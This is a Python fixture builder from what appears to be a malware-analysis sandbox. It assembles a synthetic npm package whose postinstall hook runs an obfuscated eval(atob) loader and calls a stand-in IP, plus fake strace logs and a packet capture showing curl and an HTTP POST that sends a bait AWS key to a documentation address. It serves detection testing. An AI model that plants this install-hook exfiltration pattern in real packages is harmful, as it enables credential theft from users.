"""The runner's fixture output, built by the real code path (LES-029 parity).

Each fixture runs the same rules and output builder a live job runs, over a
canned probe report or an in-memory archive. The committed ``*_output.json``
files under ``tests/fixtures/`` must equal what this module builds: change the
rules or :mod:`threat_lab.output` and regenerate them in the same commit with
``python -m threat_lab fixtures --write``.

The lab never builds Evidence. The curator side
(``tests/plugins/test_blackbox_lab_evidence.py``) feeds these outputs through
its canonical Evidence Extractor and pins the result in the matching
``*_evidence.json`` (regenerated there, from the canonical builder, with
``python -m tests.plugins.test_blackbox_lab_evidence --write``).
"""

from __future__ import annotations

import hashlib
import io
import ipaddress
import json
import struct
import tarfile
from pathlib import Path
from typing import Dict, Sequence

from . import bait, output, rules
from .guest import package_code_root, sample_processes
from .identifiers import threat_digest
from .microvm import with_traffic
from .output import RunTimes
from .schema import evidence_schema

FIXTURES_DIR = Path(__file__).resolve().parents[1] / "tests" / "fixtures"
#: Stands in for the digest of a real lab image.
FIXTURE_IMAGE_SHA256 = hashlib.sha256(b"threat-lab fixture image").hexdigest()
_STARTED, _FINISHED = 1_760_000_000, 1_760_000_012
PACKAGE_IDENTIFIER = "dep:npm:fixture-pkg@1.0.0"
URL_IDENTIFIER = "url:https://phish.example.test/login"
#: A page whose sandbox the host egress policy caught scanning (LR2).
SCANNING_IDENTIFIER = "url:https://scanner.example.test/"
#: A known malicious package: OSV MAL-2022-9 (npm ``0-dns``, every version affected —
#: the version here is notional). Its level-4 fixture is a SYNTHESIZED recording in the
#: shape the lab records (strace -ff logs, a host pcap), not a live capture: a live
#: install runs only on the KVM lab host after legal sign-off (§03.5; LR3's integration test).
MALICIOUS_PACKAGE_IDENTIFIER = "dep:npm:0-dns@1.0.0"
#: The fixture microVM's address (slot 0 on the default lab network) and its exfiltration
#: target (documentation range: the host policy drops it, but the TAP still records the try).
FIXTURE_GUEST, FIXTURE_REGISTRY_ADDRESS, FIXTURE_DROP_ADDRESS = "172.30.4.10", "104.16.1.34", "203.0.113.50"
FIXTURE_COLLECTOR = "collector.mal-fixture.test"
#: Fixture file → (identifier, level) of the job that made it.
FIXTURE_JOBS = {
    "level1_output.json": (URL_IDENTIFIER, 1),
    "level2_output.json": (PACKAGE_IDENTIFIER, 2),
    "scanning_killed_output.json": (SCANNING_IDENTIFIER, 1),
    "level4_install_output.json": (MALICIOUS_PACKAGE_IDENTIFIER, 4),
}


def fixture_package() -> bytes:
    """A small npm-style tarball: a postinstall hook, an obfuscated loader that
    posts to an IP address, and a harmless README. Byte-stable (fixed metadata,
    ustar format, no compression)."""
    files = {
        "package/package.json": json.dumps(
            {"name": "fixture-pkg", "version": "1.0.0", "scripts": {"postinstall": "node index.js"}}),
        "package/index.js": "eval(atob('" + "QUFB" * 120 + "'));\nfetch('http://203.0.113.7/collect');\n",
        "package/README.md": "A fixture package.\n",
    }
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        for name, text in files.items():
            data = text.encode("utf-8")
            info = tarfile.TarInfo(name)
            info.size, info.mtime, info.mode = len(data), 0, 0o644
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def fixture_key(name: str) -> str:
    """The job key of fixture *name* (a key of :data:`FIXTURE_JOBS`)."""
    identifier, level = FIXTURE_JOBS[name]
    return evidence_schema.job_key(threat_digest(identifier), level, FIXTURE_IMAGE_SHA256)


def build_fixtures() -> dict[str, str]:
    """``{file name: canonical raw-output JSON}`` for every fixture."""
    package = fixture_package()
    read_report = json.loads(rules.read_artifact(package).to_json())
    fetch_report = {"status": "ok", "hosts": ["registry.npmjs.org"],
                    "sha256": hashlib.sha256(package).hexdigest(), "bytes": len(package)}
    level_one = output.from_look(_times("level1_output.json"),
                                 {"status": "tls-error", "hosts": ["phish.example.test"], "details": {}})
    level_two = output.from_read(_times("level2_output.json"), fetch_report, read_report)
    scanning = output.cap_reached(_times("scanning_killed_output.json"), output.NoteCode.SCANNING_KILLED)
    guest_report = {"status": "ok", "method": "install",
                    "processes": sample_processes(fixture_install_trace(), package_code_root("npm"), "install")}
    level_four = output.from_run(_times("level4_install_output.json"),
                                 with_traffic(guest_report, fixture_install_recording(), FIXTURE_GUEST))
    return {"level1_output.json": canonical_json(level_one), "level2_output.json": canonical_json(level_two),
            "scanning_killed_output.json": canonical_json(scanning),
            "level4_install_output.json": canonical_json(level_four)}


def fixture_install_trace() -> dict[int, str]:
    """``strace -ff`` logs (pid → log) of ``npm install`` running a postinstall
    that downloads with curl. pid 100 is the lab's wrapper then npm; 101 is the
    lifecycle shell (the package's code starts here); 104 is npm's own git."""
    return {
        100: ('execve("/usr/bin/setpriv", ["setpriv", "--reuid=1000"], 0x7ffd /* 9 vars */) = 0\n'
              'execve("/usr/bin/env", ["env", "-i"], 0x7ffd /* 9 vars */) = 0\n'
              'execve("/usr/bin/npm", ["npm", "install"], 0x7ffd /* 9 vars */) = 0\n'
              'clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 101\n'
              'clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 104\n'),
        101: ('execve("/bin/sh", ["sh", "-c", "node index.js"], 0x55 /* 30 vars */) = 0\n'
              'clone(child_stack=NULL, flags=SIGCHLD) = 102\n'),
        102: ('execve("/usr/bin/node", ["node", "index.js"], 0x55 /* 30 vars */) = 0\n'
              'clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD}, 88) = 103\n'),
        103: 'execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.50/c"], 0x55 /* 30 vars */) = 0\n',
        104: ('execve("/usr/bin/git", ["git", "--version"], 0x55 /* 30 vars */) = 0\n'
              'execve("/usr/bin/missing", ["missing"], 0x55 /* 30 vars */) = -1 ENOENT (No such file or directory)\n'),
    }


def fixture_install_recording() -> bytes:
    """The host's TAP recording for that install: the registry looked up and
    reached over TLS, the collector looked up (no answer), and an HTTP POST
    carrying the bait AWS key to an address no DNS answer explains."""
    guest, resolver = FIXTURE_GUEST, "1.1.1.1"
    registry, dropped = FIXTURE_REGISTRY_ADDRESS, FIXTURE_DROP_ADDRESS
    exfiltration = (b"POST /c HTTP/1.1\r\nHost: " + dropped.encode() + b"\r\n\r\nkey="
                    + bait.AWS_ACCESS_KEY_ID.encode())
    return pcap([
        udp_frame(guest, resolver, 40000, 53, dns_query(1, "registry.npmjs.org")),
        udp_frame(resolver, guest, 53, 40000, dns_answer(1, "registry.npmjs.org", registry)),
        tcp_frame(guest, registry, 40001, 443, b"", syn=True),
        tcp_frame(guest, registry, 40001, 443, client_hello("registry.npmjs.org")),
        udp_frame(guest, resolver, 40002, 53, dns_query(2, FIXTURE_COLLECTOR)),
        tcp_frame(guest, dropped, 40003, 80, b"", syn=True),
        tcp_frame(guest, dropped, 40003, 80, exfiltration[:30]),
        tcp_frame(guest, dropped, 40003, 80, exfiltration[30:]),   # the bait split across segments
    ])


# -- recording builders: classic pcap, Ethernet + IPv4 (also used by the runner's tests) ----

def pcap(frames: Sequence[bytes]) -> bytes:
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    records = b"".join(struct.pack("<IIII", 1_760_000_000, index, len(frame), len(frame)) + frame
                       for index, frame in enumerate(frames))
    return header + records


def udp_frame(source: str, destination: str, source_port: int, destination_port: int, payload: bytes) -> bytes:
    return _frame(source, destination, 17, struct.pack("!HHHH", source_port, destination_port,
                                                       8 + len(payload), 0) + payload)


def tcp_frame(source: str, destination: str, source_port: int, destination_port: int, payload: bytes,
              syn: bool = False) -> bytes:
    flags = 0x02 if syn else 0x18                                       # SYN, or PSH+ACK
    header = struct.pack("!HHIIBBHHH", source_port, destination_port, 0, 0, 5 << 4, flags, 65535, 0, 0)
    return _frame(source, destination, 6, header + payload)


def dns_query(query_id: int, name: str) -> bytes:
    return struct.pack("!HHHHHH", query_id, 0x0100, 1, 0, 0, 0) + _dns_name(name) + struct.pack("!HH", 1, 1)


def dns_answer(query_id: int, name: str, address: str) -> bytes:
    question = _dns_name(name) + struct.pack("!HH", 1, 1)
    answer = struct.pack("!HHHIH", 0xC00C, 1, 1, 60, 4) + ipaddress.IPv4Address(address).packed
    return struct.pack("!HHHHHH", query_id, 0x8180, 1, 1, 0, 0) + question + answer


def client_hello(server_name: str) -> bytes:
    name = server_name.encode("ascii")
    sni = struct.pack("!HBH", len(name) + 3, 0, len(name)) + name
    extensions = struct.pack("!HH", 0, len(sni)) + sni
    body = (b"\x03\x03" + b"\0" * 32 + b"\x00" + struct.pack("!H", 2) + b"\x13\x01" + b"\x01\x00"
            + struct.pack("!H", len(extensions)) + extensions)
    handshake = b"\x01" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake


def _dns_name(name: str) -> bytes:
    return b"".join(bytes([len(label)]) + label.encode("ascii") for label in name.split(".")) + b"\0"


def _frame(source: str, destination: str, protocol: int, segment: bytes) -> bytes:
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(segment), 0, 0, 64, protocol, 0,
                     ipaddress.IPv4Address(source).packed, ipaddress.IPv4Address(destination).packed)
    return b"\x02" * 6 + b"\x06" * 6 + struct.pack("!H", 0x0800) + ip + segment


def canonical_json(value: object) -> str:
    """The one spelling fixture files use: sorted keys, no spaces, newline-terminated."""
    return json.dumps(value, sort_keys=True, separators=(",", ":")) + "\n"


def write_fixtures(directory: Path = FIXTURES_DIR) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    for name, text in build_fixtures().items():
        (directory / name).write_text(text, encoding="utf-8")


def _times(name: str) -> RunTimes:
    return RunTimes(fixture_key(name), _STARTED, _FINISHED)
